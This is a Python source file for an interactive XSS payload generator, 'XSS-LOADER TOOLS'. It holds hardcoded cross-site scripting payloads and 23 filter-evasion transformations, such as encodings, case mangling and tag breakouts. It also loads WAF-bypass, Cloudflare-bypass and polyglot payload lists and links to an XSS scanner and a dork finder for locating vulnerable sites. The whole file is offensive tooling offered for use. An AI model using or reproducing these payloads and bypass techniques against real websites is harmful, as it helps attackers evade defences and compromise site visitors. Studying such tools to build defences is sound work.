import base64
import html
import sys
import urllib.parse
from time import sleep
import dorktara
import xssScan
import entry


class colors:
    r = '\033[31m'
    g = '\033[32m'
    y = '\033[33m'
    b = '\033[34m'
    m = '\033[35m'
    c = '\033[36m'
    w = '\033[37m'


class payloadss:
    basic = "<script>alert(1)</script>"
    div = "<div onpointerover='alert(1)'>MOVE HERE</div>"
    img = "<img src=x onerror=alert('1');>"
    svg = "<svg onload=alert('1')>"
    body = "<body ontouchstart=alert(1)>"


class payloadsList:
    with open("waf.txt", "r", encoding="utf-8") as f:
        aa = f.read()
    with open("cloudflare.txt", "r", encoding="utf-8") as f:
        bb = f.read()
    with open("alertt.txt", "r", encoding="utf-8") as f:
        cc = f.read()
    with open("polyglot.txt", "r", encoding="utf-8") as f:
        dd = f.read()


def pylds(deger):
    if deger == 1:
        return secim.upper()
    elif deger == 2:
        return secim.replace("s", "S").replace("r", "R").replace("p", "P")
    elif deger == 3:
        return urllib.parse.quote(secim).replace("/", "%2F")
    elif deger == 4:
        return html.escape(secim)
    elif deger == 5:
        return secim.replace("script", "scri</script>pt>")
    elif deger == 6:
        return secim.encode("utf-8").hex()
    elif deger == 7:
        return secim.encode("utf-16")
    elif deger == 8:
        return secim.encode("utf-32")
    elif deger == 9:
        a = "\";alert('XSS');//"
        return a
    elif deger == 10:
        return secim.replace("<", "%uff1c").replace(">", "%uff1e")
    elif deger == 11:
        return secim.replace("<", "¼").replace(">", "¾").replace("\"", "¢")
    elif deger == 12:
        a = secim.encode('ascii')
        b = base64.b64encode(a)
        return b.decode('ascii')
    elif deger == 13:
        return secim.replace("<", "+ADw-").replace(">", "+AD4-")
    elif deger == 14:
        return secim.replace("(", "`").replace(")", "`")
    elif deger == 15:
        return secim.replace("<", "%C0%BC").replace(">", "%C0%BE").replace("'", "%CA%B9").replace("(", "%CA%B9")
    elif deger == 16:
        return "\">" + secim
    elif deger == 17:
        return "</script>" + secim
    elif deger == 18:
        return "\">" + secim + ".gif"
    elif deger == 19:
        return "<!-->" + secim + "-->"
    elif deger == 20:
        return "<noscript><p title=\"</noscript>" + secim + "\">"
    elif deger == 21:
        return "<IMG \"\"\">" + secim + "\">"
    elif deger == 22:
        return secim.replace(" ", "^L")
    elif deger == 23:
        return "<!--[if gte IE 4]>" + secim + "<![endif]-->"
    else:
        print("Wrong Choose..!")


def islem():
    x = "\nNew Payload\t:"
    y = """
|   1)  UPPER CASE                |  16)  TAG BLOCK BREAKOUT
|   2)  UPPER AND LOWER CASE      |  17)  SCRIPT BREAKOUT
|   3)  URL ENCODE                |  18)  FILE UPLOAD PAYLOAD
|   4)  HTML ENTITY ENCODE        |  19)  INSIDE COMMENTS BYPASS
|   5)  SPLIT PAYLOAD             |  20)  MUTATION PAYLOAD
|   6)  HEX ENCODE                |  21)  MALFORMED IMG
|   7)  UTF-16 ENCODE             |  22)  SPACE BYPASS
|   8)  UTF-32 ENCODE             |  23)  DOWNLEVEL-HIDDEN BLOCK
|   9)  DELETE TAG                |  24)  WAF BYPASS PAYLOADS
|   10) UNICODE ENCODE            |  25)  CLOUDFLARE BYPASS PAYLOADS
|   11) US-ASCII ENCODE           |  26)  POLYGLOT PAYLOADS
|   12) BASE64 ENCODE             |  27)  ALERT PAYLOADS
|   13) UTF-7 ENCODE              |  28)  ALL CREATE PAYLOAD
|   14) PARENTHESIS BYPASS        |  29)  GO BACK MAIN MENU
|   15) UTF-8 ENCODE              |  30)  EXIT

"""
    for c in y:
        print(colors.b + c, end='')
        sys.stdout.flush()
        sleep(0.0015)
    secim2 = input("\nPLEASE CHOOSE:")
    if secim2 == "1":
        print(x, pylds(1))
    elif secim2 == "2":
        print(x, pylds(2))
    elif secim2 == "3":
        print(x, pylds(3))
    elif secim2 == "4":
        print(x, pylds(4))
    elif secim2 == "5":
        print(x, pylds(5))
    elif secim2 == "6":
        print(x, pylds(6))
    elif secim2 == "7":
        print(x, pylds(7))
    elif secim2 == "8":
        print(x, pylds(8))
    elif secim2 == "9":
        print(x, pylds(9))
    elif secim2 == "10":
        print(x, pylds(10))
    elif secim2 == "11":
        print(x, pylds(11))
    elif secim2 == "12":
        print(x, pylds(12))
    elif secim2 == "13":
        print(x, pylds(13))
    elif secim2 == "14":
        print(x, pylds(14))
    elif secim2 == "15":
        print(x, pylds(15))
    elif secim2 == "16":
        print(x, pylds(16))
    elif secim2 == "17":
        print(x, pylds(17))
    elif secim2 == "18":
        print(x, pylds(18))
    elif secim2 == "19":
        print(x, pylds(19))
    elif secim2 == "20":
        print(x, pylds(20))
    elif secim2 == "21":
        print(x, pylds(21))
    elif secim2 == "22":
        print(x, pylds(22))
    elif secim2 == "23":
        print(x, pylds(23))
    elif secim2 == "24":
        print(x, payloadsList.aa)
    elif secim2 == "25":
        print(x, payloadsList.bb)
    elif secim2 == "26":
        print(x, payloadsList.dd)
    elif secim2 == "27":
        print(x, payloadsList.cc)
    elif secim2 == "28":
        print(pylds(1), pylds(2), pylds(3), pylds(4), pylds(5), pylds(6), pylds(7), pylds(8), pylds(9), pylds(10),
              pylds(11), pylds(12), pylds(13), pylds(14), pylds(15), pylds(16), pylds(17), pylds(18), pylds(19),
              pylds(20), pylds(21), pylds(22), pylds(23),

              sep="\n")

    elif secim2 == "29":
        Menu()
    elif secim2 == "30":
        print("Exiting...")
        sleep(3)
        print("Happy Hacking(:...")
        sys.exit(0)
    else:
        print("WRONG CHOOSE...")


entry.entryy()


def Menu():
    while True:
        print("-----------------------------------")
        print(colors.b,"|||      XSS-LOADER TOOLS      |||")
        print("-----------------------------------")
        yy = ("\n"
              "1)  BASIC PAYLOAD\n"
              "2)  DIV PAYLOAD\n"
              "3)  IMG PAYLOAD\n"
              "4)  BODY PAYLOAD\n"
              "5)  SVG PAYLOAD\n"
              "6)  ENTER YOUR PAYLOAD\n"
              "7)  XSS SCANNER\n"
              "8)  XSS DORK FINDER\n"
              "9)  EXIT\n"
              "\n")
        for c in yy:
            print(colors.y + c, end='')
            sys.stdout.flush()
            sleep(0.0015)
        global secim
        secim = input("SELECT PAYLOAD TO TAG:")
        if secim == "1":
            print(colors.r, "Selected Payload\t: ", payloadss.basic)
            secim = payloadss.basic
            islem()
            sleep(2)
        elif secim == "2":
            print(payloadss.div)
            secim = payloadss.div
            islem()
            sleep(2)
        elif secim == "3":
            print(payloadss.img)
            secim = payloadss.img
            islem()
            sleep(2)
        elif secim == "4":
            print(payloadss.body)
            secim = payloadss.body
            islem()
            sleep(2)
        elif secim == "5":
            print(payloadss.svg)
            secim = payloadss.svg
            islem()
            sleep(2)
        elif secim == "6":
            a = input("Payload\t:")
            secim = a
            islem()
            sleep(2)
        elif secim == "7":
            xssScan.xssFind()
        elif secim == "8":
            dorktara.dorkFind()
        elif secim == "9":
            print("Exiting...")
            sleep(3)
            print("Happy Hacking(:...")
            sys.exit()

        else:
            print("Please Select a Valid Option..!!!")


Menu()
